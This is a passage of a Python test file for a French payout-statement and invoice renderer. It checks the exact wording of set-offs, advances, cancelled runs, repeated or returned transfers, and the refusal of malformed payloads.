        invoice_text(_doc(nothing))
    )
    deferred = statement_payload()
    deferred["documents"][0].update(
        settles_minor="0", due_date="2026-12-02", payment_reference=nothing["payment_reference"]
    )
    assert (
        "À régler par compensation sur le prochain reversement (art. 7.2 du mandat), au plus "
        "tard le 02/12/2026."
    ) in statement_text(deferred, "0" * 64)


def test_a_run_that_transfers_nothing_is_worded_so() -> None:
    """legal#5: N = 0, the plan posted at approval: no transfer, set off on that day."""
    inv = invoice_text(_doc(zero_net_invoice_payload()))
    assert (
        "Compensation le 02/11/2026 avec les sommes encaissées pour votre compte, relevé de "
        "reversement RV-2026-000002 (aucun virement) : 464,40\u00a0€"
    ) in inv
    assert "exécution demandée" not in inv
    st = statement_text(zero_net_statement_payload(), "0" * 64)
    assert "Compensée le 02/11/2026 avec les sommes vous revenant (art. 7.2 du mandat)" in st
    assert "Commission compensée le 02/11/2026 : -568,40\u00a0€" in st
    assert (
        "Facture FC-2026-000001 du 20/10/2026 : compensation le 02/11/2026 : 104,00\u00a0€."
    ) in st
    assert "Les compensations ci-dessus ont été réalisées le 02/11/2026, sans virement." in st
    assert "au débit du virement" not in st and "présent reversement" not in st
    lower = st.lower()
    assert " payé" not in lower and " réglé" not in lower and "payée" not in lower


def test_a_run_that_recovers_an_advance_says_so() -> None:
    """M2c-7b (plan §4.2: the statement unchanged, its goldens gain a run that recovers an advance):
    the claw-back clause takes an advance from the run (an `earlier_settled` row of kind advance);
    the statement states it, at its date once set off, never as paid, and never names a remission;
    the golden fixture's own bytes are not this payload's (test_the_golden_hashes unchanged)."""
    p = statement_payload()
    p["earlier_settled"] = [
        *p["earlier_settled"],
        {"kind": "advance", "document_kind": "advance", "amount_minor": "200000"},
    ]
    st = statement_text(p, "0" * 64)
    assert (
        "Remboursement d'une avance du cabinet : à régler par compensation sur le présent "
        "reversement : 2\u202f000,00\u00a0€."
    ) in st
    done = zero_net_statement_payload()
    done["earlier_settled"] = [
        *done["earlier_settled"],
        {"kind": "advance", "document_kind": "advance", "amount_minor": "20000"},
    ]
    st = statement_text(done, "0" * 64)
    assert (
        "Remboursement d'une avance du cabinet : compensation le 02/11/2026 : 200,00\u00a0€."
    ) in st
    lower = st.lower()
    assert "abandon" not in lower and "remise" not in lower and " payé" not in lower


def test_a_run_cancelled_before_its_statement_sets_nothing_off() -> None:
    """legal#2, figures#0: the statement says the run was cancelled; no net, no set-off, the gross
    still owed; the invoice annulled by the cancellation's credit note."""
    st = statement_text(cancelled_statement_payload(), "0" * 64)
    for absent in (
        "Montant net",
        "Commission à régler par compensation",
        "à régler par compensation sur le présent reversement",
        "Après le présent reversement",
        "au débit du virement",
    ):
        assert absent not in st, absent
    for present in (
        "Reversement annulé le 03/11/2026 avant l'exécution de son virement : rien n'a été viré "
        "ni compensé",
        "Facture FC-2026-000003 du 02/11/2026 (mandat MAND-MARTIN-2026) : HT 387,00\u00a0€, TVA "
        "20\u00a0% 77,40\u00a0€, TTC 464,40\u00a0€. Annulée par l'avoir FC-2026-000005 du "
        "03/11/2026.",
        "Avoir FC-2026-000005 du 03/11/2026 (mandat MAND-MARTIN-2026) : HT -387,00\u00a0€",
        "Après l'annulation du reversement : 2\u202f433,45\u00a0€",
        "Le reversement étant annulé, aucune compensation n'est réalisée",
    ):
        assert present in st, present


def test_files_with_earlier_lines_only_are_named_apart() -> None:
    """tests-ui#4: a file in the PDF's table with only earlier lines priced now (0 lines) is
    counted apart, so the table and « … sur N dossier(s) » agree."""
    p = statement_payload()
    p["totals"]["repriced_only_file_count"] = 1
    assert (
        "1 dossier(s) du tableau n'ont pas d'encaissement dans ce relevé : seule la commission "
        "d'encaissements précédents y est calculée."
    ) in statement_text(p, "0" * 64)


def test_what_a_manual_credit_notes_waiver_absorbed_is_named() -> None:
    """M2c-5b: a reversal whose credit a manual credit note's waiver absorbed has a commission line
    with no credit note for that part; the statement says so, naming the manual credit note(s) and
    the invoice each rectifies (review legal#4: « déjà crédités », never « rendus » — a refund the
    note leaves is only ordered with the payout), so the period's commission and the documents
    agree in words. Absent from a payload without it (the bytes of statements drawn before are
    unchanged: the golden hashes)."""
    p = statement_payload()
    assert "avoir manuel" not in statement_text(p, "0" * 64)
    p["totals"]["waived_absorbed_minor"] = "9000"
    p["totals"]["waived_absorbed_invoices"] = ["FC-2026-000001"]
    p["totals"]["waived_absorbed_credit_notes"] = [
        {"number": "FC-2026-000002", "invoice": "FC-2026-000001"}
    ]
    text = statement_text(p, "0" * 64)
    assert (
        "Dont -90,00\u00a0€ de commission sur des encaissements annulés, déjà crédités par avoir "
        "manuel (avoir n° FC-2026-000002 rectifiant la facture FC-2026-000001) : aucun nouvel "
        "avoir pour ce montant."
    ) in text
    assert "rendu" not in text
    p["totals"]["waived_absorbed_credit_notes"].append(
        {"number": "FC-2026-000005", "invoice": "FC-2026-000003"}
    )
    assert (
        "déjà crédités par avoir manuel (avoirs n° FC-2026-000002 rectifiant la facture "
        "FC-2026-000001, n° FC-2026-000005 rectifiant la facture FC-2026-000003)"
    ) in statement_text(p, "0" * 64)
    del p["totals"]["waived_absorbed_credit_notes"]  # a payload frozen without them
    p["totals"]["waived_absorbed_invoices"] = ["FC-2026-000001", "FC-2026-000003"]
    assert (
        "déjà crédités par avoir manuel sur les factures FC-2026-000001, FC-2026-000003 : aucun "
        "nouvel avoir pour ce montant."
    ) in statement_text(p, "0" * 64)


def test_the_money_not_remitted_is_stated_at_k() -> None:
    """figures#2: section 6 is the state at K, which it names."""
    st = statement_text(statement_payload(), "0" * 64)
    assert "Sommes reçues sur vos dossiers et non reversées\nAu 02/11/2026 à 05:47 :" in st


# -- « Suivi » (M2c-6b-2d, template fr-3; plan docs/design/m2c-6b-2-plan.md §5) -------------------

SUIVI = "Suivi de vos reversements précédents"
E = "\u00a0€"
M1640 = f"1\u202f640,00{E}"


def _suivi(events: list[dict[str, object]], since: object = SINCE) -> list[str]:
    """The « Suivi » paragraphs of the statement fixture with these events."""
    p = statement_payload()
    p["previous_payouts"] = {"since": since, "events": events}
    section = next(s for s in statement_view(p, "0" * 64).sections if s.title == SUIVI)
    return list(section.texts)


def _ev(kind: str, **kw: object) -> dict[str, object]:
    base = next(e for e in SUIVI_EVENTS if e["kind"] == kind)  # the first of its kind
    return {**base, **kw}


@pytest.mark.parametrize(
    ("event", "words"),
    [
        (
            _ev("debited"),
            f"Reversement RV-2026-000001 : virement de {M1640} (référence RMT0A1B2C3D4E5F) débité "
            "de notre compte dédié le 03/11/2026.",
        ),
        (
            _ev("returned"),
            f"Reversement RV-2026-000001 : virement de {M1640} débité le 03/11/2026, revenu impayé "
            "le 05/11/2026 ; son montant figure dans le présent reversement (« Virement revenu "
            "impayé — reversé à nouveau »).",
        ),
        (
            _ev("returned", repaid="run", repaid_by="RV-2026-000003"),
            f"Reversement RV-2026-000001 : virement de {M1640} débité le 03/11/2026, revenu impayé "
            "le 05/11/2026 ; reversé à nouveau par le reversement RV-2026-000003.",
        ),
        (
            _ev("returned", repaid="pending"),
            f"Reversement RV-2026-000001 : virement de {M1640} débité le 03/11/2026, revenu impayé "
            "le 05/11/2026 ; son montant vous sera reversé par un prochain reversement.",
        ),
        (
            _ev("cancelled"),
            "Reversement RV-2026-000004 annulé le 03/11/2026, avant que son virement soit remis à "
            "la banque.",
        ),
        (
            _ev("executed_after_cancellation", advance_minor="0", p_bound="amount"),
            "Reversement RV-2026-000005 annulé le 03/11/2026 : la banque a néanmoins exécuté son "
            f"virement de {M1640} le 05/11/2026 ; ce montant, que vous avez reçu, figure dans le "
            "présent reversement (« Virement exécuté hors reversement »).",
        ),
        (
            _ev("executed_after_cancellation", p_bound="items"),
            "Reversement RV-2026-000005 annulé le 03/11/2026 : la banque a néanmoins exécuté son "
            f"virement de {M1640} le 05/11/2026 ; ce montant, que vous avez reçu, figure dans le "
            "présent reversement (« Virement exécuté hors reversement »), et « Avance du cabinet » "
            "pour la part qui n'a pas pu être déduite de vos sommes en attente "
            f"(440,00{E}) : elle dépassait ce qui restait à vous reverser des sommes de ce "
            "reversement.",
        ),
        (
            _ev("executed_after_cancellation", p_bound="none"),
            "Reversement RV-2026-000005 annulé le 03/11/2026 : la banque a néanmoins exécuté son "
            f"virement de {M1640} le 05/11/2026 ; ce montant, que vous avez reçu, figure dans le "
            "présent reversement (« Virement exécuté hors reversement »), et « Avance du cabinet » "
            "pour la part qui n'a pas pu être déduite de vos sommes en attente "
            f"(440,00{E}) : elle dépassait ce qui restait à vous reverser des sommes de ce "
            "reversement.",
        ),
        (
            _ev("executed_after_cancellation"),
            "Reversement RV-2026-000005 annulé le 03/11/2026 : la banque a néanmoins exécuté son "
            f"virement de {M1640} le 05/11/2026 ; ce montant, que vous avez reçu, figure dans le "
            "présent reversement (« Virement exécuté hors reversement »), et « Avance du cabinet » "
            "pour la part qui n'a pas pu être déduite de vos sommes en attente "
            f"(440,00{E}) : vos sommes en attente à cette date ne permettaient pas d'en déduire "
            "davantage.",
        ),
        (
            _ev("executed_after_cancellation", here=False),
            "Reversement RV-2026-000005 annulé le 03/11/2026 : la banque a néanmoins exécuté son "
            f"virement de {M1640} le 05/11/2026 ; il sera pris en compte dans un prochain "
            "reversement.",
        ),
        (
            _ev("debited_again"),
            "Reversement RV-2026-000006 : la banque a exécuté son virement une seconde fois le "
            f"05/11/2026 ({M1640}) ; ce second virement, que vous avez reçu, figure dans le "
            "présent reversement (« Virement exécuté hors reversement », et « Avance du cabinet » "
            f"pour ce second virement ({M1640})).",
        ),
        (
            _ev("debited_again", advance_minor="0", p_bound="amount"),
            "Reversement RV-2026-000006 : la banque a exécuté son virement une seconde fois le "
            f"05/11/2026 ({M1640}) ; ce second virement, que vous avez reçu, figure dans le "
            "présent reversement (« Virement exécuté hors reversement »).",
        ),
        (
            # S03r: a returned payout executed again, P = what its return left owed: the advance
            # is the rest, never the whole second payout
            _ev("debited_again", advance_minor="44000", p_bound="items"),
            "Reversement RV-2026-000006 : la banque a exécuté son virement une seconde fois le "
            f"05/11/2026 ({M1640}) ; ce second virement, que vous avez reçu, figure dans le "
            "présent reversement (« Virement exécuté hors reversement », et « Avance du cabinet » "
            "pour ce second virement (440,00\u00a0€)).",
        ),
        (
            _ev("debited_again", here=False),
            "Reversement RV-2026-000006 : la banque a exécuté son virement une seconde fois le "
            f"05/11/2026 ({M1640}) ; il sera pris en compte dans un prochain reversement.",
        ),
        (
            # review round 1 (legal-texts-1): a third execution is never « une seconde fois »
            _ev("debited_again", execution_no=3),
            "Reversement RV-2026-000006 : la banque a exécuté son virement de nouveau le "
            f"05/11/2026 ({M1640} ; 3e exécution) ; ce nouveau virement, que vous avez reçu, "
            "figure dans le présent reversement (« Virement exécuté hors reversement », et "
            f"« Avance du cabinet » pour ce nouveau virement ({M1640})).",
        ),
        (
            _ev("debited_again", execution_no=4, here=False),
            "Reversement RV-2026-000006 : la banque a exécuté son virement de nouveau le "
            f"05/11/2026 ({M1640} ; 4e exécution) ; il sera pris en compte dans un prochain "
            "reversement.",
        ),
        (
            # review round 1 (statement-money): executed by the bank before the planned debit,
            # booked after it — neither « une seconde fois » nor « ce second virement »
            _ev("debited_again", execution_no=1, before_debit=True, debited_on="2026-11-07"),
            "Reversement RV-2026-000006 : la banque a exécuté son virement le 05/11/2026 "
            f"({M1640}), en plus de son débit du 07/11/2026 ; ce virement en plus, que vous avez "
            "reçu, figure dans le présent reversement (« Virement exécuté hors reversement », et "
            f"« Avance du cabinet » pour ce virement en plus ({M1640})).",
        ),
        (
            _ev(
                "debited_again",
                execution_no=1,
                before_debit=True,
                debited_on="2026-11-07",
                here=False,
            ),
            "Reversement RV-2026-000006 : la banque a exécuté son virement le 05/11/2026 "
            f"({M1640}), en plus de son débit du 07/11/2026 ; il sera pris en compte dans un "
            "prochain reversement.",
        ),
        (
            # review round 1: a cancelled run's payout executed a second time
            _ev("executed_after_cancellation", execution_no=2, advance_minor="0", p_bound="amount"),
            "Reversement RV-2026-000005 annulé le 03/11/2026 : la banque a de nouveau exécuté son "
            f"virement de {M1640} le 05/11/2026 (2e exécution) ; ce montant, que vous avez reçu, "
            "figure dans le présent reversement (« Virement exécuté hors reversement »).",
        ),
        (
            _ev("unplanned_returned"),
            f"Le virement de {M1640} exécuté hors reversement le 05/11/2026 est revenu le "
            "10/11/2026 : l'avance du cabinet correspondante est annulée et "
            f"1\u202f200,00{E} vous sont de nouveau dus ; voir « Virement exécuté hors reversement "
            "revenu » dans le présent reversement.",
        ),
        (
            _ev(
                "unplanned_returned",
                run_number=None,
                advance_minor="164000",
                owed_minor="0",
                here=False,
            ),
            f"Le virement de {M1640} exécuté hors reversement le 05/11/2026 est revenu le "
            "10/11/2026 : l'avance du cabinet correspondante est annulée.",
        ),
        (
            _ev("unplanned_returned", advance_minor="0", owed_minor="164000"),
            f"Le virement de {M1640} exécuté hors reversement le 05/11/2026 est revenu le "
            f"10/11/2026 : {M1640} vous sont de nouveau dus ; voir « Virement exécuté hors "
            "reversement revenu » dans le présent reversement.",
        ),
        (
            _ev("executed_outside"),
            f"Virement de {M1640} vers votre compte IBAN …4350 le 06/11/2026, exécuté hors de tout "
            "reversement : il figure dans le présent reversement (« Virement exécuté hors "
            "reversement » et « Avance du cabinet »).",
        ),
        (
            _ev("executed_outside", here=False),
            f"Virement de {M1640} vers votre compte IBAN …4350 le 06/11/2026, exécuté hors de tout "
            "reversement ; il sera pris en compte dans un prochain reversement.",
        ),
        (
            # (Q8's alternative: P = A) no advance, none named
            _ev("executed_outside", advance_minor="0"),
            f"Virement de {M1640} vers votre compte IBAN …4350 le 06/11/2026, exécuté hors de tout "
            "reversement : il figure dans le présent reversement (« Virement exécuté hors "
            "reversement »).",
        ),
    ],
)
def test_each_previous_payout_event_is_worded_from_its_payload(
    event: dict[str, object], words: str
) -> None:
    """Plan §5: one sentence per event, from the payload alone (amounts and dates as the SQL
    gave them; nothing computed here); the repaid state of a return (here, run, pending); the
    advance clause by the bound that set P (critic F17, L16, critic2 ML-9: `queue` never says the
    advance « dépassait » the run's sums; `amount` has no advance and no clause); an event this
    run does not hold « sera pris en compte dans un prochain reversement »."""
    assert _suivi([event]) == [words]


@pytest.mark.parametrize(
    "event",
    [
        _ev("debited_again", execution_no=None),
        _ev("debited_again", debited_on=None),
        _ev("debited_again", execution_no=1, before_debit=False),
        _ev("executed_after_cancellation", execution_no=None),
    ],
)
def test_an_execution_without_its_rank_or_its_debit_is_refused(event: dict[str, object]) -> None:
    """Review round 1 (statement-money, legal-texts-1): « une seconde fois » is said only of the
    second execution, which the SQL ranks; a payload without the rank, without the planned debit
    an execution repeats, or ranked first though not before that debit cannot be worded
    truthfully: refused (payload_version), never drawn with a guess."""
    with pytest.raises(StatementPayloadError, match="payload_version"):
        _suivi([event])


def test_the_advance_clause_never_says_the_run_s_sums_were_exceeded_when_the_queue_bound() -> None:
    """critic2 ML-9: all of the cancelled run still owed, P bounded by the queue — the advance
    is never said to exceed the run's sums."""
    (text,) = _suivi([_ev("executed_after_cancellation", p_bound="queue")])
    assert "dépassait" not in text and "ne permettaient pas d'en déduire davantage" in text


def test_the_events_keep_the_payload_order() -> None:
    """The SQL orders the events (their date, then the run number); the renderer keeps it."""
    texts = _suivi(list(reversed(SUIVI_EVENTS)))
    assert texts[0].startswith("Le virement de") and texts[-1].startswith(
        "Reversement RV-2026-000001 : virement de"
    )
    assert len(_suivi(SUIVI_EVENTS)) == len(SUIVI_EVENTS)


def test_nothing_to_report_names_the_previous_statement_or_says_there_is_none() -> None:
    """critic L17: the window starts at the previous approved run's K, which « Rien à signaler »
    names with that run; a first statement has no previous run."""
    assert _suivi([]) == [
        "Rien à signaler sur vos reversements précédents depuis le relevé RV-2026-000001 "
        "(encaissements connus au 20/10/2026 à 17:30)."
    ]
    assert _suivi([], since=None) == ["Aucun reversement précédent à suivre."]


def test_an_iban_is_printed_by_its_last_four_characters_only() -> None:
    """Review 6b-2c (T1, pages-2): no country code or check digits hard-coded — « IBAN …1234 »
    from the last four characters SQL returns, whatever the IBAN's country."""
    (text,) = _suivi([_ev("executed_outside", iban_last4="606E")])
    assert "vers votre compte IBAN …606E le" in text and "FR76" not in text


def test_a_payload_drawn_for_another_template_is_refused_payload_version() -> None:
    """Stored statements are never re-rendered (fr-3 only): a payload with M2c-5's `follow_up`,
    one without `previous_payouts`, or an event this template does not know is refused, never
    drawn with a section missing."""
    old = statement_payload()
    old["follow_up"] = []
    missing = statement_payload()
    del missing["previous_payouts"]
    unknown = statement_payload()
    unknown["previous_payouts"]["events"] = [{"kind": "still_in_flight", "on": "2026-11-03"}]
    for p in (old, missing, unknown):
        with pytest.raises(StatementPayloadError, match="payload_version"):
            render_statement_pdf(p, "0" * 64)
    for p in (old, missing):
        with pytest.raises(StatementPayloadError, match="payload_version"):
            render_statement_csv(p)
        with pytest.raises(StatementPayloadError, match="payload_version"):
            line_records(p)


def test_a_late_line_paid_by_an_unplanned_payout_states_when_and_how_much() -> None:
    """critic L9, critic2 ML-9 (Q15's default: the item keeps its own clock): a late line an
    unplanned payout paid, as of K, states that payout's date — « versé le … » when the attributed
    amount covers the line (cause `paid_by_unplanned`); review round 1 (legal-texts-3): one it
    paid in part keeps its own cause for the rest, « … ; dont … versés le … » after it. A full cause
    short of the line, or an attribution without its amount or date, is refused."""
    from document_cases import COLUMNS  # noqa: PLC0415

    p = statement_payload()
    at = {
        c: COLUMNS.index(c)
        for c in ("late_cause", "paid_by_unplanned_minor", "paid_by_unplanned_on")
    }
    line = p["lines"][1]  # 500,00 € late
    line[at["late_cause"]] = "paid_by_unplanned"
    line[at["paid_by_unplanned_on"]] = "2026-10-28"
    line[at["paid_by_unplanned_minor"]] = "50000"
    assert (
        _csv_rows(p)[1]["hors_delai"]
        == "oui \u2013 versé le 28/10/2026 par un virement exécuté hors reversement"
    )
    line[at["late_cause"]] = "approved_late"
    line[at["paid_by_unplanned_minor"]] = "12000"
    assert (
        _csv_rows(p)[1]["hors_delai"] == f"oui \u2013 validation tardive ; dont 120,00{E} versés "
        "le 28/10/2026 par un virement exécuté hors reversement"
    )
    assert render_statement_pdf(p, "0" * 64).startswith(b"%PDF")
    line[at["late_cause"]] = "paid_by_unplanned"
    with pytest.raises(StatementPayloadError, match="payload_version"):
        line_records(p)  # the full cause for part of the line
    line[at["late_cause"]] = "approved_late"
    line[at["paid_by_unplanned_on"]] = None
    with pytest.raises(StatementPayloadError, match="payload_version"):
        line_records(p)
    line[at["late_cause"]] = "paid_by_unplanned"
    with pytest.raises(StatementPayloadError, match="payload_version"):
        line_records(p)
